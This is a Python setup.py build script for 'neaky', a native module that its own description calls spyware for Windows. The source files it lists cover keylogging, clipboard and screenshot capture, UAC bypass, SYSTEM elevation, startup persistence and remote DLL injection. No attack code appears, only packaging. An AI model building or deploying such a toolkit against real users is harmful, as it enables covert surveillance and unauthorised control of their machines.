from setuptools import setup, Extension
import pathlib

# The directory containing this file
HERE = pathlib.Path(__file__).parent

# The text of the README file
README = (HERE / "README.md").read_text(encoding='utf-8')

# TODO dynamically generates source files list?

module1 = Extension('neaky',
                    sources=['neaky/neakymodule.c', 'neaky/py_functions.cpp', 'neaky/utils.cpp',
                             'neaky/persist/startup.cpp', 'neaky/persist/remote_dll_injection.cpp',
                             'neaky/elevate/get_system.cpp', 'neaky/elevate/uac_bypass.cpp',
                             'neaky/spy/keylog_hook.cpp', 'neaky/spy/clipboard.cpp', 'neaky/spy/keylog_rawinput.cpp', 'neaky/spy/screenshot.cpp'],
                    include_dirs=['neaky/include'],
                    libraries=["shcore", "kernel32", "user32", "gdi32", "winspool", "comdlg32",
                               "advapi32", "shell32", "ole32", "oleaut32", "uuid", "odbc32", "odbccp32"],
                    define_macros=[("UNICODE", None)])


setup(name='neaky',
      version='1.0.0',
      description='A python native module providing some spyware function on Windows.',
      long_description=README,
      long_description_content_type="text/markdown",
      url="https://github.com/am009/pyneaky",
      author="Warren Wang",
      author_email="warrenwjk@gmail.com",
      license="MIT",
      classifiers=[
            "License :: OSI Approved :: MIT License",
            "Programming Language :: Python :: 3",
            "Programming Language :: Python :: 3.7",
      ],
      packages=['neaky'],
      ext_modules=[module1],
      python_requires=">=3.4")
